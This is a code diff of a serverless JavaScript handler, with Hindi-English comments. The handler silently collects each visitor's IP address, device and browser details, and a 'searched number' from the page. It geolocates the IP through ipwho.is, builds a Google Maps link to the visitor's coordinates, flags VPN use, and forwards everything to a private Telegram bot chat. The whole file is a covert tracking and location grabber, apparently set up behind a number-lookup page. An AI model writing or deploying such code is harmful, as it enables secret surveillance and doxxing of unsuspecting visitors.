@@ -18,40 +18,59 @@ export default async function handler(request) {
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-    // ===== SERVER-SIDE DATA =====
-    const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim() || 'Unknown';
+    // ===== IP Address nikaalo =====
+    const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim()
+            || request.headers.get('x-real-ip')
+            || request.headers.get('cf-connecting-ip')
+            || 'Unknown';
+
     const userAgent = request.headers.get('user-agent') || 'Unknown';
     const referer = request.headers.get('referer') || 'Direct';
     const acceptLang = request.headers.get('accept-language') || 'Unknown';
 
-    // ===== IP LOOKUP (ip-api.com se) =====
+    // ===== IP LOOKUP (ipwho.is se) =====
     let ipInfo = {
       isp: 'Unknown',
       org: 'Unknown',
       as: 'Unknown',
       asname: 'Unknown',
+      reverse: 'Unknown',
       proxy: false,
       hosting: false,
       mobile: false,
+      country: 'Unknown',
+      city: 'Unknown',
+      region: 'Unknown',
+      regionName: 'Unknown',
+      zip: 'Unknown',
+      lat: null,
+      lon: null,
+      timezone: 'Unknown',
     };
 
     try {
       if (ip && ip !== 'Unknown' && ip !== '127.0.0.1' && !ip.startsWith('192.168')) {
-        const ipRes = await fetch(
-          `http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query`
-        );
+        const ipRes = await fetch(`https://ipwho.is/${ip}`);
         const ipData = await ipRes.json();
-        
-        if (ipData.status === 'success') {
+
+        if (ipData.success) {
           ipInfo = {
-            isp: ipData.isp || 'Unknown',
-            org: ipData.org || 'Unknown',
-            as: ipData.as || 'Unknown',
-            asname: ipData.asname || 'Unknown',
-            reverse: ipData.reverse || 'Unknown',
-            proxy: ipData.proxy || false,
-            hosting: ipData.hosting || false,
-            mobile: ipData.mobile || false,
+            isp: ipData.connection?.isp || 'Unknown',
+            org: ipData.connection?.org || 'Unknown',
+            as: `AS${ipData.connection?.asn || '?'}`,
+            asname: ipData.connection?.domain || 'Unknown',
+            reverse: ipData.connection?.domain || 'Unknown',
+            proxy: ipData.security?.proxy || false,
+            hosting: ipData.security?.hosting || false,
+            mobile: ipData.connection?.type === 'mobile',
+            country: ipData.country || 'Unknown',
+            city: ipData.city || 'Unknown',
+            region: ipData.region_code || 'Unknown',
+            regionName: ipData.region || 'Unknown',
+            zip: ipData.postal || 'Unknown',
+            lat: ipData.latitude || null,
+            lon: ipData.longitude || null,
+            timezone: ipData.timezone?.id || 'Unknown',
           };
         }
       }
@@ -59,7 +78,7 @@ export default async function handler(request) {
       console.error('IP lookup failed:', e);
     }
 
-    // ===== CLIENT-SIDE DATA =====
+    // ===== CLIENT-SIDE DATA (frontend se) =====
     const body = await request.json().catch(() => ({}));
     const searchType = body.searchType || 'Unknown';
     const searchedNumber = body.searchedNumber || 'Not provided';
@@ -83,20 +102,23 @@ export default async function handler(request) {
     const pageLoadTime = body.pageLoadTime || 'Unknown';
     const vendor = body.vendor || 'Unknown';
 
+    // ===== DEVICE DETECT =====
     const device = detectDevice(userAgent);
     const browser = detectBrowser(userAgent);
     const os = detectOS(userAgent);
 
+    // ===== TIMESTAMP =====
     const timestamp = new Date().toLocaleString('en-IN', {
       timeZone: 'Asia/Kolkata',
     });
 
+    // ===== MAPS LINK =====
     const mapsLink =
       ipInfo.lat && ipInfo.lon
         ? `https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}`
         : 'Not available';
 
-    // ===== PROXY/VPN WARNING =====
+    // ===== VPN WARNING =====
     let vpnWarning = '';
     if (ipInfo.proxy || ipInfo.hosting) {
       vpnWarning = '\n⚠️ *WARNING: VPN/Proxy Detected!*';
@@ -117,17 +139,17 @@ export default async function handler(request) {
 🏭 *Organization:* ${ipInfo.org}
 🔢 *ASN:* ${ipInfo.as}
 📛 *AS Name:* ${ipInfo.asname}
-🔄 *Reverse DNS:* ${ipInfo.reverse || 'N/A'}
+🔄 *Reverse DNS:* ${ipInfo.reverse}
 
 ━━━━━━━━━━━━━━━━━━━━
 📍 *Location*
 ━━━━━━━━━━━━━━━━━━━━
-🌍 *Country:* ${ipInfo.country || 'Unknown'}
-🏙️ *City:* ${ipInfo.city || 'Unknown'}
-📍 *Region:* ${ipInfo.regionName || 'Unknown'} (${ipInfo.region || 'N/A'})
-📮 *Postal:* ${ipInfo.zip || 'Unknown'}
+🌍 *Country:* ${ipInfo.country}
+🏙️ *City:* ${ipInfo.city}
+📍 *Region:* ${ipInfo.regionName} (${ipInfo.region})
+📮 *Postal:* ${ipInfo.zip}
 🗺️ *Coords:* ${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}
-🕐 *Timezone:* ${ipInfo.timezone || 'Unknown'}
+🕐 *Timezone:* ${ipInfo.timezone}
 🔗 [Open in Maps](${mapsLink})
 
 ━━━━━━━━━━━━━━━━━━━━
@@ -175,6 +197,7 @@ export default async function handler(request) {
 \`${userAgent}\`
 `;
 
+    // ===== TELEGRAM PE BHEJO =====
     const tgResponse = await fetch(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
       {
